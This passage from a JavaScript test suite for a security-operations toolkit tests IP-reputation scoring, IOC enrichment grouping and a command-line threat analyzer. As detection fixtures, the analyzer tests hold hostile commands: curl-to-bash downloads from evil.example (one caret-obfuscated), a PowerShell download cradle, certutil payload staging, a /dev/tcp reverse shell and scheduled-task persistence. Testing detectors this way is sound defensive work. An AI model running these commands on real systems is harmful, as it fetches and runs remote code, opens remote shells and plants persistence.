    const abuse = { provider: 'abuseipdb', status: 'success', data: { abuseConfidenceScore: 10 } };
    s = buildIpSummary([abuse, ipto]);
    assert.strictEqual(s.riskScore, 10, 'AbuseIPDB score must win');
    assert.strictEqual(s.verdict, 'clean');
    assert.strictEqual(s.tags.join(','), 'proxy', 'flags still tagged when AbuseIPDB present');
  });

  await test('IPAddress.to summary: non-success source is ignored', () => {
    const s = buildIpSummary([{ provider: 'ipaddressto', status: 'error', data: { fraud_score: '99' } }]);
    assert.strictEqual(s.riskScore, 0);
    assert.strictEqual(s.tags.length, 0);
  });
  console.log(' [PASS] IPAddress.to Normalization');

  // ==================== Enrichment grouping (real SOCToolkit methods) ====================
  console.log('\n--- Enrichment Grouping Tests ---');

  await test('normalizeEnrichType: agent types collapse; non-enrichable types return null', () => {
    assert.strictEqual(toolkit.normalizeEnrichType('ip'), 'ip');
    assert.strictEqual(toolkit.normalizeEnrichType('ipv4'), 'ip');
    assert.strictEqual(toolkit.normalizeEnrichType('ipv6'), 'ip');
    assert.strictEqual(toolkit.normalizeEnrichType('sha256'), 'hash');
    assert.strictEqual(toolkit.normalizeEnrichType('md5'), 'hash');
    assert.strictEqual(toolkit.normalizeEnrichType('hash'), 'hash');
    assert.strictEqual(toolkit.normalizeEnrichType('domain'), 'domain');
    assert.strictEqual(toolkit.normalizeEnrichType('url'), 'url');
    assert.strictEqual(toolkit.normalizeEnrichType('email'), null);
    assert.strictEqual(toolkit.normalizeEnrichType('cve'), null);
    assert.strictEqual(toolkit.normalizeEnrichType('mac'), null);
    assert.strictEqual(toolkit.normalizeEnrichType(undefined), null);
  });

  await test('splitEnrichmentCap: caps at 5, dedupes, remainder holds the rest', () => {
    const { queued, remainder } = toolkit.splitEnrichmentCap(
      ['1.1.1.1', '2.2.2.2', '3.3.3.3', '4.4.4.4', '5.5.5.5', '6.6.6.6', '6.6.6.6'], 5);
    assert.strictEqual(queued.length, 5);
    assert.strictEqual(remainder.join(','), '6.6.6.6');
    const empty = toolkit.splitEnrichmentCap([], 5);
    assert.strictEqual(empty.queued.length, 0);
    assert.strictEqual(empty.remainder.length, 0);
    const few = toolkit.splitEnrichmentCap(['a', 'b'], 5);
    assert.strictEqual(few.queued.join(','), 'a,b');
    assert.strictEqual(few.remainder.length, 0);
    assert.strictEqual(toolkit.autoEnrich, false, 'auto-enrich must default to off');
  });

  await test('groupEnrichableByType: groups by agent type, drops non-enrichable', () => {
    const iocs = [
      { category: 'ipv4', value: '1.1.1.1' },
      { category: 'ip', value: '2.2.2.2' },
      { category: 'domain', value: 'a.com' },
      { category: 'domain', value: 'b.com' },
      { category: 'sha256', value: 'd' },
      { category: 'email', value: 'x@y.com' },
      { category: 'cve', value: 'CVE-2024-1234' }
    ];
    const g = toolkit.groupEnrichableByType(iocs);
    assert.strictEqual(g.ip.join(','), '1.1.1.1,2.2.2.2');
    assert.strictEqual(g.domain.join(','), 'a.com,b.com');
    assert.strictEqual(g.hash.join(','), 'd');
    assert.strictEqual(g.email, undefined);
    assert.strictEqual(g.cve, undefined);
  });

  await test('enrichment remainder: _enrichRemaining drains held types and empties the store', () => {
    toolkit._enrichmentRemainder = { ip: ['9.9.9.9'], domain: ['c.com', 'd.com'] };
    toolkit._enrichRemaining();
    assert.strictEqual(Object.keys(toolkit._enrichmentRemainder).length, 0, 'remainder must be drained');
    toolkit._enrichRemaining();
    assert.strictEqual(Object.keys(toolkit._enrichmentRemainder).length, 0, 'draining an empty remainder is a no-op');
  });

  // ==================== Command Line Analyzer (real SOCToolkit rules) ====================
  console.log('\n--- Command Line Analyzer Tests ---');

  await test('cmdline: benign admin commands match nothing', () => {
    for (const text of ['ipconfig /all', 'git status', 'dir C:\\Users', 'echo hello world']) {
      const r = toolkit.analyzeCommandLine(text);
      assert.strictEqual(r.matched.length, 0, `"${text}" should match no rules: ` +
        r.matched.map((m) => m.id).join(','));
      assert.strictEqual(r.verdict, 'clean');
    }
  });

  await test('cmdline: encoded PowerShell is high risk', () => {
    const r = toolkit.analyzeCommandLine('powershell -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA');
    assert.ok(r.matched.some((m) => m.id === 'ps-encodedcommand'), 'encodedcommand rule must fire');
    assert.ok(r.matched.some((m) => m.id === 'ps-stealth-flags'), 'stealth flags rule must fire');
    assert.strictEqual(r.verdict, 'suspicious');
  });

  await test('cmdline: caret-split curl|bash is caught after normalization', () => {
    const r = toolkit.analyzeCommandLine('c^u^r^l -s http://evil.example/x.sh | b^a^s^h');
    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell'), 'curl|bash must match through carets');
    assert.ok(r.findings.some((f) => /caret/i.test(f.title)), 'caret obfuscation must be reported');
    assert.strictEqual(r.verdict, 'malicious');
  });

  await test('cmdline: camelCase IEX download cradle is caught', () => {
    const r = toolkit.analyzeCommandLine("iNvOkE-eXpReSsIoN (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')");
    assert.ok(r.matched.some((m) => m.id === 'ps-iex'), 'IEX must match case-insensitively');
    assert.ok(r.matched.some((m) => m.id === 'webclient-download'), 'download cradle must match');
    assert.ok(r.findings.some((f) => /mixed-case/i.test(f.title)), 'mixed-case spelling must be reported');
    assert.strictEqual(r.verdict, 'malicious');
  });

  await test('cmdline: certutil staging from TEMP matches two rules', () => {
    const r = toolkit.analyzeCommandLine('certutil -urlcache -f http://evil.example/p.exe %TEMP%\\p.exe');
    assert.ok(r.matched.some((m) => m.id === 'certutil-fetch'));
    assert.ok(r.matched.some((m) => m.id === 'exec-from-userdir'));
    // One high + one medium stays below the high-risk bar: suspicious.
    assert.strictEqual(r.verdict, 'suspicious');
  });

  await test('cmdline: bash reverse shell via /dev/tcp', () => {
    const r = toolkit.analyzeCommandLine('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
    assert.ok(r.matched.some((m) => m.id === 'reverse-shell-tcp'));
    assert.strictEqual(r.verdict, 'suspicious');
  });

  await test('cmdline: curl|bash is critical', () => {
    const r = toolkit.analyzeCommandLine('curl -sSL https://get.evil.example/x | sudo bash');
    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell' && m.sev === 'critical'));
    assert.strictEqual(r.verdict, 'malicious');
  });

  await test('cmdline: schtasks persistence from Public dir', () => {
    const r = toolkit.analyzeCommandLine('schtasks /create /tn upd /tr C:\\Users\\Public\\u.exe /sc onlogon');
    assert.ok(r.matched.some((m) => m.id === 'schtasks-create'));
    // High + medium: suspicious, not high risk — a scheduled task alone can be admin work.
    assert.strictEqual(r.verdict, 'suspicious');
  });

  await test('cmdline: single medium signal lands on review, not suspicious', () => {
    const r = toolkit.analyzeCommandLine('klist purge');
    assert.ok(r.matched.some((m) => m.id === 'kerberos-purge'));
    assert.strictEqual(r.verdict, 'review', 'one medium hit is review-level');
  });

  await test('cmdline: looksLikeCommandLine gates the auto-offer', () => {
    assert.strictEqual(toolkit.looksLikeCommandLine('powershell -command Get-Process'), true);
    assert.strictEqual(toolkit.looksLikeCommandLine('curl http://evil.example/x | bash'), true);
    assert.strictEqual(toolkit.looksLikeCommandLine('c^u^r^l -s http://x'), true);
    assert.strictEqual(toolkit.looksLikeCommandLine('Contact admin@example.com about invoice 42'), false);
    assert.strictEqual(toolkit.looksLikeCommandLine('short'), false);
  });

  await test('cmdline: plain -e flag is not an encoded PowerShell match', () => {
    // 16+ base64 chars after the flag are required, so ordinary -e use stays clean.
    const r = toolkit.analyzeCommandLine('curl -e https://referer.example http://example.com/file');
    assert.ok(!r.matched.some((m) => m.id === 'ps-encodedcommand'),
      'plain -e must not trigger the encodedcommand rule');
  });

  console.log(' [PASS] Command Line Analyzer');

  console.log('\nTest Summary:');
  console.log('  Passed:', passed);
  console.log('  Failed:', failed);
  console.log('========================================');

  process.exit(failed > 0 ? 1 : 0);
}

main().catch((e) => {
  console.error('[FAIL] harness load:', e.message);
  process.exit(1);
});
